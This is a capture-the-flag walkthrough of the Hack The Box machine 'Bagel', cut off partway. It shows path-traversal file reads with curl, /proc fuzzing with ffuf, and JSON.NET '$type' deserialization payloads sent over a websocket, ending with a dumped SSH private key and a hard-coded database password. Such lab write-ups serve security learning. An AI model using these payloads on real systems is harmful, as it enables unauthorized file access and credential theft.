# Bagel HTB Walkthrough


![Bagel](./bagel.png)

## Introduction

A fun machine that begins by exploiting a Python Flask app via Local File Inclusion, and using this to further enumerate the machine.  From here, we take an unexpected change in direction to exploit a web socket running on .NET core.  Using a JSON deserialization attack, we are able to take advantage of LFI once again to find a private SSH key and gain a foothold. We are able to access another account using previously discovered hard-coded database credentials.  From here, with access to run the dotnet binary as root, we are able to easily spawn an F# interactive shell and break out to a root shell.

## Enumeration

Let's run a port scan to find running services:

```bash
$nmap -sC -sV -o nmap/initial 10.10.11.201
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-07 18:45 AEST
Nmap scan report for 10.10.11.201
Host is up (0.24s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.8 (protocol 2.0)
| ssh-hostkey: 
|   256 6e4e1341f2fed9e0f7275bededcc68c2 (ECDSA)
|_  256 80a7cd10e72fdb958b869b1b20652a98 (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 400 Bad Request
|     Server: Microsoft-NetCore/2.0
|     Date: Fri, 07 Apr 2023 08:46:07 GMT
|     Connection: close
|   HTTPOptions: 
|     HTTP/1.1 400 Bad Request
|     Server: Microsoft-NetCore/2.0
|     Date: Fri, 07 Apr 2023 08:46:24 GMT
|     Connection: close
|   Help, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/html
|     Server: Microsoft-NetCore/2.0
|     Date: Fri, 07 Apr 2023 08:46:35 GMT
|     Content-Length: 52
|     Connection: close
|     Keep-Alive: true
|     <h1>Bad Request (Invalid request line (parts).)</h1>
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/html
|     Server: Microsoft-NetCore/2.0
|     Date: Fri, 07 Apr 2023 08:46:08 GMT
|     Content-Length: 54
|     Connection: close
|     Keep-Alive: true
|     <h1>Bad Request (Invalid request line (version).)</h1>
|   TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/html
|     Server: Microsoft-NetCore/2.0
|     Date: Fri, 07 Apr 2023 08:46:36 GMT
|     Content-Length: 52
|     Connection: close
|     Keep-Alive: true
|_    <h1>Bad Request (Invalid request line (parts).)</h1>
8000/tcp open  http-alt Werkzeug/2.2.2 Python/3.10.9
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/2.2.2 Python/3.10.9
|     Date: Fri, 07 Apr 2023 08:46:08 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.1 302 FOUND
|     Server: Werkzeug/2.2.2 Python/3.10.9
|     Date: Fri, 07 Apr 2023 08:46:03 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 263
|     Location: http://bagel.htb:8000/?page=index.html
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to the target URL: <a href="http://bagel.htb:8000/?page=index.html">http://bagel.htb:8000/?page=index.html</a>. If not, click the link.
|   Socks5: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request syntax ('
|     ').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
|_http-title: Did not follow redirect to http://bagel.htb:8000/?page=index.html
|_http-server-header: Werkzeug/2.2.2 Python/3.10.9
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5000-TCP:V=7.93%I=7%D=4/7%Time=642FD851%P=x86_64-pc-linux-gnu%r(Get
SF:Request,73,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nServer:\x20Microsoft-
SF:NetCore/2\.0\r\nDate:\x20Fri,\x2007\x20Apr\x202023\x2008:46:07\x20GMT\r
SF:\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,E8,"HTTP/1\.1\x20400\x20
SF:Bad\x20Request\r\nContent-Type:\x20text/html\r\nServer:\x20Microsoft-Ne
SF:tCore/2\.0\r\nDate:\x20Fri,\x2007\x20Apr\x202023\x2008:46:08\x20GMT\r\n
SF:Content-Length:\x2054\r\nConnection:\x20close\r\nKeep-Alive:\x20true\r\
SF:n\r\n<h1>Bad\x20Request\x20\(Invalid\x20request\x20line\x20\(version\)\
SF:.\)</h1>")%r(HTTPOptions,73,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nServ
SF:er:\x20Microsoft-NetCore/2\.0\r\nDate:\x20Fri,\x2007\x20Apr\x202023\x20
SF:08:46:24\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(Help,E6,"HTTP/1\.1\
SF:x20400\x20Bad\x20Request\r\nContent-Type:\x20text/html\r\nServer:\x20Mi
SF:crosoft-NetCore/2\.0\r\nDate:\x20Fri,\x2007\x20Apr\x202023\x2008:46:35\
SF:x20GMT\r\nContent-Length:\x2052\r\nConnection:\x20close\r\nKeep-Alive:\
SF:x20true\r\n\r\n<h1>Bad\x20Request\x20\(Invalid\x20request\x20line\x20\(
SF:parts\)\.\)</h1>")%r(SSLSessionReq,E6,"HTTP/1\.1\x20400\x20Bad\x20Reque
SF:st\r\nContent-Type:\x20text/html\r\nServer:\x20Microsoft-NetCore/2\.0\r
SF:\nDate:\x20Fri,\x2007\x20Apr\x202023\x2008:46:35\x20GMT\r\nContent-Leng
SF:th:\x2052\r\nConnection:\x20close\r\nKeep-Alive:\x20true\r\n\r\n<h1>Bad
SF:\x20Request\x20\(Invalid\x20request\x20line\x20\(parts\)\.\)</h1>")%r(T
SF:erminalServerCookie,E6,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-T
SF:ype:\x20text/html\r\nServer:\x20Microsoft-NetCore/2\.0\r\nDate:\x20Fri,
SF:\x2007\x20Apr\x202023\x2008:46:36\x20GMT\r\nContent-Length:\x2052\r\nCo
SF:nnection:\x20close\r\nKeep-Alive:\x20true\r\n\r\n<h1>Bad\x20Request\x20
SF:\(Invalid\x20request\x20line\x20\(parts\)\.\)</h1>")%r(TLSSessionReq,E6
SF:,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/html\r\nS
SF:erver:\x20Microsoft-NetCore/2\.0\r\nDate:\x20Fri,\x2007\x20Apr\x202023\
SF:x2008:46:36\x20GMT\r\nContent-Length:\x2052\r\nConnection:\x20close\r\n
SF:Keep-Alive:\x20true\r\n\r\n<h1>Bad\x20Request\x20\(Invalid\x20request\x
SF:20line\x20\(parts\)\.\)</h1>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8000-TCP:V=7.93%I=7%D=4/7%Time=642FD84C%P=x86_64-pc-linux-gnu%r(Get
SF:Request,1EA,"HTTP/1\.1\x20302\x20FOUND\r\nServer:\x20Werkzeug/2\.2\.2\x
SF:20Python/3\.10\.9\r\nDate:\x20Fri,\x2007\x20Apr\x202023\x2008:46:03\x20
SF:GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\
SF:x20263\r\nLocation:\x20http://bagel\.htb:8000/\?page=index\.html\r\nCon
SF:nection:\x20close\r\n\r\n<!doctype\x20html>\n<html\x20lang=en>\n<title>
SF:Redirecting\.\.\.</title>\n<h1>Redirecting\.\.\.</h1>\n<p>You\x20should
SF:\x20be\x20redirected\x20automatically\x20to\x20the\x20target\x20URL:\x2
SF:0<a\x20href=\"http://bagel\.htb:8000/\?page=index\.html\">http://bagel\
SF:.htb:8000/\?page=index\.html</a>\.\x20If\x20not,\x20click\x20the\x20lin
SF:k\.\n")%r(FourOhFourRequest,184,"HTTP/1\.1\x20404\x20NOT\x20FOUND\r\nSe
SF:rver:\x20Werkzeug/2\.2\.2\x20Python/3\.10\.9\r\nDate:\x20Fri,\x2007\x20
SF:Apr\x202023\x2008:46:08\x20GMT\r\nContent-Type:\x20text/html;\x20charse
SF:t=utf-8\r\nContent-Length:\x20207\r\nConnection:\x20close\r\n\r\n<!doct
SF:ype\x20html>\n<html\x20lang=en>\n<title>404\x20Not\x20Found</title>\n<h
SF:1>Not\x20Found</h1>\n<p>The\x20requested\x20URL\x20was\x20not\x20found\
SF:x20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x20URL\x20manua
SF:lly\x20please\x20check\x20your\x20spelling\x20and\x20try\x20again\.</p>
SF:\n")%r(Socks5,213,"<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML
SF:\x204\.01//EN\"\n\x20\x20\x20\x20\x20\x20\x20\x20\"http://www\.w3\.org/
SF:TR/html4/strict\.dtd\">\n<html>\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x
SF:20\x20\x20\x20\x20<meta\x20http-equiv=\"Content-Type\"\x20content=\"tex
SF:t/html;charset=utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<title>Error\x
SF:20response</title>\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<body>\n\x
SF:20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20response</h1>\n\x20\x20\x20\
SF:x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>\n\x20\x20\x20\x20\x20\x
SF:20\x20\x20<p>Message:\x20Bad\x20request\x20syntax\x20\('\\x05\\x04\\x00
SF:\\x01\\x02\\x80\\x05\\x01\\x00\\x03'\)\.</p>\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20<p>Error\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-
SF:\x20Bad\x20request\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20
SF:\x20\x20\x20</body>\n</html>\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 137.12 seconds
```

Apart from SSH running, we see something on port 5000, and a HTTP server that appears to be werkzeug on port 8000 which redirects to http://bagel.htb:8000/?page=index.html .   Adding `110.10.11.201 bagel.htb` to our `/etc/hosts`and browsing here, we get a fairly nice and delicious landing page:

![](./assets/2023-04-07-18-52-57-image.png)

Following the link to the orders page, where I don't see an order under my name -- and that makes me sad:

![](./assets/2023-04-07-18-54-06-image.png)

## Foothold

I ran feroxbuster in the background, then started trying Local File Inclusion with path traversal (note the `page=index.html` query param on our home page).  And, this straight forward path traversal works:

```bash
$curl "http://bagel.htb:8000/?page=../../../../../etc/passwd" 
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
tss:x:59:59:Account used for TPM access:/dev/null:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/usr/sbin/nologin
systemd-oom:x:999:999:systemd Userspace OOM Killer:/:/usr/sbin/nologin
systemd-resolve:x:193:193:systemd Resolver:/:/usr/sbin/nologin
polkitd:x:998:997:User for polkitd:/:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
abrt:x:173:173::/etc/abrt:/sbin/nologin
setroubleshoot:x:997:995:SELinux troubleshoot server:/var/lib/setroubleshoot:/sbin/nologin
cockpit-ws:x:996:994:User for cockpit web service:/nonexisting:/sbin/nologin
cockpit-wsinstance:x:995:993:User for cockpit-ws instances:/nonexisting:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/usr/share/empty.sshd:/sbin/nologin
chrony:x:994:992::/var/lib/chrony:/sbin/nologin
dnsmasq:x:993:991:Dnsmasq DHCP and DNS server:/var/lib/dnsmasq:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
systemd-coredump:x:989:989:systemd Core Dumper:/:/usr/sbin/nologin
systemd-timesync:x:988:988:systemd Time Synchronization:/:/usr/sbin/nologin
developer:x:1000:1000::/home/developer:/bin/bash
phil:x:1001:1001::/home/phil:/bin/bash
_laurel:x:987:987::/var/log/laurel:/bin/false
```

Apart from `root`, the `developer` and `phil` (user id >= 1000) look interesting.  I tried reading `../../../../home/developer/.ssh/id_rsa` and `../../../../home/phil/.ssh/id_rsa`, hoping to get a private SSH key, but just got `File not found`.

We can use procfs via LFI to enumerate further.  We try reading the environment by using `/proc/self/environ`, along with `/proc/self/cmdline`, to see the current process and arguments:

```bash
$curl "http://bagel.htb:8000/?page=../../../../../proc/self/environ" --output -
LANG=en_US.UTF-8PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/binHOME=/home/developerLOGNAME=developerUSER=developerSHELL=/bin/bashINVOCATION_ID=f9c0f362492c4ff9a36ee87a5a311a25JOURNAL_STREAM=8:25486SYSTEMD_EXEC_PID=897% 
curl "http://bagel.htb:8000/?page=../../../../../proc/self/cmdline" --output - 
python3/home/developer/app/app.py%          
```

So the target is running a flask app with `python3 /home/developer/app/app.py`.  Let's take a look now we've identified the app entry point:

```bash
$curl "http://bagel.htb:8000/?page=../../../../../home/developer/app/app.py" --output -
from flask import Flask, request, send_file, redirect, Response
import os.path
import websocket,json

app = Flask(__name__)

@app.route('/')
def index():
        if 'page' in request.args:
            page = 'static/'+request.args.get('page')
            if os.path.isfile(page):
                resp=send_file(page)
                resp.direct_passthrough = False
                if os.path.getsize(page) == 0:
                    resp.headers["Content-Length"]=str(len(resp.get_data()))
                return resp
            else:
                return "File not found"
        else:
                return redirect('http://bagel.htb:8000/?page=index.html', code=302)

@app.route('/orders')
def order(): # don't forget to run the order app first with "dotnet <path to .dll>" command. Use your ssh key to access the machine.
    try:
        ws = websocket.WebSocket()    
        ws.connect("ws://127.0.0.1:5000/") # connect to order app
        order = {"ReadOrder":"orders.txt"}
        data = str(json.dumps(order))
        ws.send(data)
        result = ws.recv()
        return(json.loads(result)['ReadOrder'])
    except:
        return("Unable to connect")

if __name__ == '__main__':
  app.run(host='0.0.0.0', port=8000)
```

This stood out: 

```# don't forget to run the order app first with "dotnet <path to .dll>" command. Use your ssh key to access the machine.```

But I wasn't able to read a private key for the `developer` user:

```bash
$curl "http://bagel.htb:8000/?page=../../../../../home/developer/.ssh/id_rsa" --output - 
File not found%       
```

Our `/orders` endpoint connects to `localhost:5000` as a websocket, sending a JSON payload `{"ReadOrder": "orders.txt"}`, hence the text that displays.  Let's try sending the same payload to the websocket, which is exposed to us on port 5000 using `wsdump` :

```bash
$wsdump ws://bagel.htb:5000 
Press Ctrl+C to quit
> {"ReadOrder":"orders.txt"}

< {
  "UserId": 0,
  "Session": "Unauthorized",
  "Time": "12:28:42",
  "RemoveOrder": null,
  "WriteOrder": null,
  "ReadOrder": "order #1 address: NY. 99 Wall St., client name: P.Morgan, details: [20 chocko-bagels]\norder #2 address: Berlin. 339 Landsberger.A., client name: J.Smith, details: [50 bagels]\norder #3 address: Warsaw. 437 Radomska., client name: A.Kowalska, details: [93 bel-bagels] \n"
```

Can we write orders?

```bash
> {"WriteOrder": "Em - infinity+1 bagels plz"}
< {
  "UserId": 0,
  "Session": "Unauthorized",
  "Time": "12:44:27",
  "RemoveOrder": null,
  "WriteOrder": "Operation successed",
  "ReadOrder": null
}
```

Yep:

![](./assets/2023-04-07-19-44-56-image.png)

Obviously the orders app is running as a separate process on port 5000.  Can we find it?  Once again, we can use procfs -- specifically `/proc/PID/cmdline` -- to find the process and arguments as we did above for `self` -- let's pass in a sequence of PIDs, and output the results from `ffuf` to the `out` directory , filtering out 0 byte (empty) and 14 byte (`File not found`) responses:

```bash
$seq 1 1000 | ffuf -w - -u "http://bagel.htb:8000/?page=../../../../../proc/FUZZ/cmdline" -od out -fs 0,14
```

Running a `tail -n +1 out/*` and sifting through the results, the following stands out (remember the comment we found earlier hinting at running a DLL via `dotnet`):

```
==> out/0a7b93ebd4dc507bede6ef31821461da <==
GET /?page=../../../../../proc/931/cmdline HTTP/1.1
Host: bagel.htb:8000
User-Agent: Fuzz Faster U Fool v1.4.1-dev
Accept-Encoding: gzip


---- ↑ Request ---- Response ↓ ----

HTTP/1.1 200 OK
Connection: close
Content-Length: 45
Cache-Control: no-cache
Content-Disposition: inline; filename=cmdline
Content-Type: application/octet-stream
Date: Fri, 07 Apr 2023 10:22:33 GMT
Date: Fri, 07 Apr 2023 10:22:33 GMT
Etag: "1680862003.0064297-0-927076966"
Last-Modified: Fri, 07 Apr 2023 10:06:43 GMT
Server: Werkzeug/2.2.2 Python/3.10.9

dotnet /opt/bagel/bin/Debug/net6.0/bagel.dll
```

Let's take a copy of our .NET based DLL:

```bash
$curl "http://bagel.htb:8000/?page=../../../../../opt/bagel/bin/Debug/net6.0/bagel.dll" --output - > bagel.dll
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 10752  100 10752    0     0  22322      0 --:--:-- --:--:-- --:--:-- 22307
$file bagel.dll
bagel.dll: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
```

I found a cross-platform compiled version of ILSpy here: [AvaloniaILSpy](https://github.com/icsharpcode/AvaloniaILSpy), allowing me to decompile bagel.dll on Linux.  Digging through the assembly, classes, and their methods, a few things stood out.  Database credentials:

![](./assets/2023-04-07-21-32-30-image.png)

Maybe this password is reused?  Unfortunately it didn't work when attempting to SSH as `developer` or `phil`:

```bash
$sshpass -p k8wdAYYKyhnjg3K ssh phil@bagel.htb
phil@bagel.htb: Permission denied (publickey,gssapi-keyex,gssapi-with-mic).
$sshpass -p k8wdAYYKyhnjg3K ssh developer@bagel.htb
developer@bagel.htb: Permission denied (publickey,gssapi-keyex,gssapi-with-mic).
```

This deserialisation also caught my attention in the `Handler` class:

![](./assets/2023-04-09-15-03-29-image.png)

This Microsoft page [CA2326: Do not use TypeNameHandling values other than None (code analysis) - .NET | Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/fundamentals/code-analysis/quality-rules/ca2326) is explicit in not allowing TypeNameHandling, which is a non-zero value -- our bagel.dll assembly above sets this to 4, which is *Auto*.

In theory, this should allow us to inject into our payload in such a way that we can deserialize into any .NET type we specify.

Bagel has its own `File` class:

![](./assets/2023-04-09-15-33-25-image.png)

Back in our websocket, let's try passing an object to deserialise by using `$type`:

```
> {"RemoveOrder": {"$type": "bagel_server.File, bagel", "directory": "/tmp/", "filename": "foo.txt", "WriteFile": "foobagelbaz" }}

< {
  "UserId": 0,
  "Session": "Unauthorized",
  "Time": "8:30:44",
  "RemoveOrder": {
    "$type": "bagel_server.File, bagel",
    "ReadFile": null,
    "WriteFile": "Operation successed"
  },
  "WriteOrder": null,
  "ReadOrder": null
}
```

Here, I'm naively trying to deserialize a `bagel_server.File` object, passing the string `foobagelbaz` into the `WriteFile` setter, while overwriting the `directory` and `filename` -- hoping I can write arbitrary data to arbitrary locations.

This kinda works -- data is written, but the directory/filename were not set.  We can see it was written to the default location `/opt/bagel/orders/orders.txt`:

![](./assets/2023-04-09-15-35-07-image.png)

I'm assuming I can't deserialize into private fields (and it's been a while since I've used .NET!).

I next looked at the `System.Data.ObjectDataProvider` gadget after reading about .NET deserialization on [HackTricks](https://book.hacktricks.xyz/pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net).  This class lets you instantiate an object of a specified type and call methods on it.  So, I tried to create a `bagel_server.File`, and call `WriteFile("/tmp/test.txt", "foobagelbaz")`:

```
{"RemoveOrder": {"$type":"System.Windows.Data.ObjectDataProvider,PresentationFramework,Version=4.0.0.0,Culture=neutral,PublicKeyToken=31bf3856ad364e35","MethodName":"WriteContent","MethodParameters":{"$type":"System.Collections.ArrayList,mscorlib,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089","$values":["/tmp/test.txt","foobagelbaz"]},"ObjectInstance":{"$type":"bagel_server.File,bagel"}}}
< "{\"Message\":\"unknown\"}"
```

Trying to retrieve with http://bagel.htb:8000/?page=../../../../tmp/test.txt gave `File Not found` -- so this didn't work (maybe I'm specifying the wrong type version, or it's just not available in dotnetcore given we're looking at Linux server?)

I confirmed I can call the `ReadFile` setter with an arbitrary filename (using path traversal) and get back the results, so another cool way of doing LFI.

Via our web socket, we read `/etc/passwd` again as a test:

```
> {"RemoveOrder": {"$type": "bagel_server.File, bagel", "ReadFile": "../../../etc/passwd"}}
< {
  "UserId": 0,
  "Session": "Unauthorized",
  "Time": "9:19:41",
  "RemoveOrder": {
    "$type": "bagel_server.File, bagel",
    "ReadFile": "root:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/spool/mail:/sbin/nologin\noperator:x:11:0:operator:/root:/sbin/nologin\ngames:x:12:100:games:/usr/games:/sbin/nologin\nftp:x:14:50:FTP User:/var/ftp:/sbin/nologin\nnobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin\ndbus:x:81:81:System message bus:/:/sbin/nologin\ntss:x:59:59:Account used for TPM access:/dev/null:/sbin/nologin\nsystemd-network:x:192:192:systemd Network Management:/:/usr/sbin/nologin\nsystemd-oom:x:999:999:systemd Userspace OOM Killer:/:/usr/sbin/nologin\nsystemd-resolve:x:193:193:systemd Resolver:/:/usr/sbin/nologin\npolkitd:x:998:997:User for polkitd:/:/sbin/nologin\nrpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin\nabrt:x:173:173::/etc/abrt:/sbin/nologin\nsetroubleshoot:x:997:995:SELinux troubleshoot server:/var/lib/setroubleshoot:/sbin/nologin\ncockpit-ws:x:996:994:User for cockpit web service:/nonexisting:/sbin/nologin\ncockpit-wsinstance:x:995:993:User for cockpit-ws instances:/nonexisting:/sbin/nologin\nrpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin\nsshd:x:74:74:Privilege-separated SSH:/usr/share/empty.sshd:/sbin/nologin\nchrony:x:994:992::/var/lib/chrony:/sbin/nologin\ndnsmasq:x:993:991:Dnsmasq DHCP and DNS server:/var/lib/dnsmasq:/sbin/nologin\ntcpdump:x:72:72::/:/sbin/nologin\nsystemd-coredump:x:989:989:systemd Core Dumper:/:/usr/sbin/nologin\nsystemd-timesync:x:988:988:systemd Time Synchronization:/:/usr/sbin/nologin\ndeveloper:x:1000:1000::/home/developer:/bin/bash\nphil:x:1001:1001::/home/phil:/bin/bash\n_laurel:x:987:987::/var/log/laurel:/bin/false",
    "WriteFile": null
  },
  "WriteOrder": null,
  "ReadOrder": null
```

The comment in python code earlier mentions `Use your ssh key to access the machine`.  We get nothing back for `/home/developer/.ssh/id_rsa`, but we get a private key for `/home/phil/.ssh/id_rsa`!  So obviously our Flask app did not have read permission on the key, but our dotnet bagel app does:

```
> {"RemoveOrder": {"$type": "bagel_server.File, bagel", "ReadFile": "../../../home/developer/.ssh/id_rsa"}}
> 
< {
  "UserId": 0,
  "Session": "Unauthorized",
  "Time": "9:22:02",
  "RemoveOrder": {
    "$type": "bagel_server.File, bagel",
    "ReadFile": "Order not found!",
    "WriteFile": null
  },
  "WriteOrder": null,
  "ReadOrder": null
}
< null
> {"RemoveOrder": {"$type": "bagel_server.File, bagel", "ReadFile": "../../../home/phil/.ssh/id_rsa"}}
< {
  "UserId": 0,
  "Session": "Unauthorized",
  "Time": "9:22:17",
  "RemoveOrder": {
    "$type": "bagel_server.File, bagel",
    "ReadFile": "-----BEGIN OPENSSH PRIVATE KEY-----\n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\nnrEIIvsBGmrx0AAAAKcGhpbEBiYWdlbAE=\n-----END OPENSSH PRIVATE KEY-----",
    "WriteFile": null
